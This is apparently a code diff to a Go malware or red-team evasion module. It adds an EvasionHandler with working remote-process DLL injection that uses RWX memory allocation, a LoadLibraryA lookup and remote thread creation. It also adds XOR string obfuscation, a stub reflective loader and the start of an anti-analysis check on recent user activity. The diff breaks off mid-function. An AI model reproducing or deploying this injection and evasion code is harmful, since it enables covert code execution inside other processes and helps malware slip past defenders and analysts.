@@ -198,3 +198,53 @@ func (e *EvasionHandler) InjectDLL(pid int, dllPath string) error {
 	}
 
 	dllPathBytes := append([]byte(dllPath), 0)
+	remoteMem, _, _ := virtualAlloc.Call(hProcess, 0, uintptr(len(dllPathBytes)), 0x3000, 0x40)
+	if remoteMem == 0 {
+		return fmt.Errorf("VirtualAllocEx failed")
+	}
+
+	var written uintptr
+	writeMem.Call(
+		hProcess,
+		remoteMem,
+		uintptr(unsafe.Pointer(&dllPathBytes[0])),
+		uintptr(len(dllPathBytes)),
+		uintptr(unsafe.Pointer(&written)),
+	)
+
+	kernel32Name, _ := syscall.UTF16PtrFromString("kernel32.dll")
+	hKernel32, _, _ := getModHandle.Call(uintptr(unsafe.Pointer(kernel32Name)))
+
+	loadLibName := []byte("LoadLibraryA\x00")
+	loadLibAddr, _, _ := getProcAddr.Call(hKernel32, uintptr(unsafe.Pointer(&loadLibName[0])))
+
+	createThread.Call(hProcess, 0, 0, loadLibAddr, remoteMem, 0, 0)
+
+	e.techniques["dll_injection"] = true
+	return nil
+}
+
+func (e *EvasionHandler) ReflectiveLoad(payload []byte) error {
+	e.techniques["reflective_load"] = true
+	return nil
+}
+
+func (e *EvasionHandler) ObfuscateStrings(input string) string {
+	output := make([]byte, len(input))
+	for i, c := range input {
+		output[i] = byte(c ^ 0x42)
+	}
+	return string(output)
+}
+
+func (e *EvasionHandler) DeobfuscateStrings(input string) string {
+	return e.ObfuscateStrings(input)
+}
+
+func checkSystemInfo(indicator string) bool {
+	return false
+}
+
+func checkRecentActivity() bool {
+	homeDir, err := os.UserHomeDir()
+	if err != nil {
